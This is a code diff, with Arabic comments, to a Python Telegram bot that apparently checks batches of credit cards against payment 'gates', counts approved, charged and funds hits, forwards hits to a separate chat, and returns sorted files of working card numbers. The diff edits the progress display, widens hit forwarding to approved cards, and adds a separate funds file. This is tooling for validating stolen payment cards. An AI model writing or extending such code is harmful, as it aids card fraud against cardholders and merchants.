@@ -90,11 +90,36 @@ def update_progress_ui(uid, chat_id, message_id, card, status, gate_name, total,
     percent = int((session.checked / total) * 100) if total > 0 else 0
 
     kb = types.InlineKeyboardMarkup(row_width=1)
+    # تنظيف الرد لعرضه فقط بدون الاسم والمبلغ (استخدام clean_response من utils.messages)
+    from utils.messages import clean_response
+    clean_status = clean_response(status)
+    
+    # الحصول على اسم الدالة من المفتاح
+    gate_func_name = "N/A"
+    for k, v in AVAILABLE_GATES.items():
+        if v["name"] == gate_name:
+            gate_func_name = k
+            break
+
     kb.add(
         types.InlineKeyboardButton(f"━ 𝗖𝗖 • {card}", callback_data="x"),
-        types.InlineKeyboardButton(f"━ 𝗦𝗧𝗔𝗧𝗨𝗦 • {status}", callback_data="x"),
+        types.InlineKeyboardButton(f"━ 𝗚𝗔𝗧𝗘 • {gate_func_name}", callback_data="x"),
+        types.InlineKeyboardButton(f"{clean_status}", callback_data="x"),
         types.InlineKeyboardButton(f"━ {'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅' if gate_type == 'AUTH' else '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡'} • {session.approved if gate_type == 'AUTH' else session.charged}", callback_data="x"),
-        types.InlineKeyboardButton(f"━ {'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌' if gate_type == 'AUTH' else '𝗙𝗨𝗡𝗗𝗦 💸'} • {session.declined if gate_type == 'AUTH' else session.funds}", callback_data="x"),
+    )
+    
+    # إضافة زر FUNDS و DECLINED بناءً على نوع البوابة
+    if gate_type == 'CHARGE':
+        kb.add(
+            types.InlineKeyboardButton(f"━ 𝗙𝗨𝗡𝗗𝗦 💸 • {session.funds}", callback_data="x"),
+            types.InlineKeyboardButton(f"━ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • {session.declined}", callback_data="x")
+        )
+    else:
+        kb.add(
+            types.InlineKeyboardButton(f"━ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ • {session.declined}", callback_data="x")
+        )
+        
+    kb.add(
         types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • {session.checked} / {total}", callback_data="x"),
         types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖Ｋ", callback_data="combo:stop"),
     )
@@ -332,8 +357,8 @@ def run_check(uid, chat_id, message_id, gate_key, total, cost, user_name):
                     except Exception as e:
                         logger.error(f"[SEND_CARD_MSG_ERR] UID={uid} Card={card} Err={e}")
 
-                # ===== إرسال HIT_CHAT فقط للـ Charged و Funds =====
-                if hit_type in ["charged", "funds"]:
+                # ===== إرسال HIT_CHAT للـ Charged و Funds و Approved =====
+                if hit_type in ["charged", "funds", "approved"]:
                     try:
                         bot_instance.send_message(
                             HIT_CHAT,
@@ -386,12 +411,11 @@ def run_check(uid, chat_id, message_id, gate_key, total, cost, user_name):
 
         # ==================== إنشاء وإرسال الملفات ====================
         try:
-            # 1. ملف Approved (يشمل Approved و Funds)
-            all_approved = session.approved_cards + session.funds_cards
-            if all_approved:
-                approved_file = io.BytesIO("\n".join(all_approved).encode())
+            # 1. ملف Approved
+            if session.approved_cards:
+                approved_file = io.BytesIO("\n".join(session.approved_cards).encode())
                 approved_file.name = f"Approved_{session.original_filename}"
-                bot_instance.send_document(chat_id, approved_file, caption=f"<b>[@chk_error_bot] Approved_Cards: {len(all_approved)}</b>", parse_mode="HTML")
+                bot_instance.send_document(chat_id, approved_file, caption=f"<b>[@chk_error_bot] Approved_Cards: {len(session.approved_cards)}</b>", parse_mode="HTML")
 
             # 2. ملف Charged
             if session.charged_cards:
@@ -399,7 +423,13 @@ def run_check(uid, chat_id, message_id, gate_key, total, cost, user_name):
                 charged_file.name = f"Charged_{session.original_filename}"
                 bot_instance.send_document(chat_id, charged_file, caption=f"<b>[@chk_error_bot] Charged_Cards: {len(session.charged_cards)}</b>", parse_mode="HTML")
 
-            # 3. ملف Declined
+            # 3. ملف Funds
+            if session.funds_cards:
+                funds_file = io.BytesIO("\n".join(session.funds_cards).encode())
+                funds_file.name = f"Funds_{session.original_filename}"
+                bot_instance.send_document(chat_id, funds_file, caption=f"<b>[@chk_error_bot] Funds_Cards: {len(session.funds_cards)}</b>", parse_mode="HTML")
+
+            # 4. ملف Declined
             if session.declined_cards:
                 declined_file = io.BytesIO("\n".join(session.declined_cards).encode())
                 declined_file.name = f"Declined_{session.original_filename}"
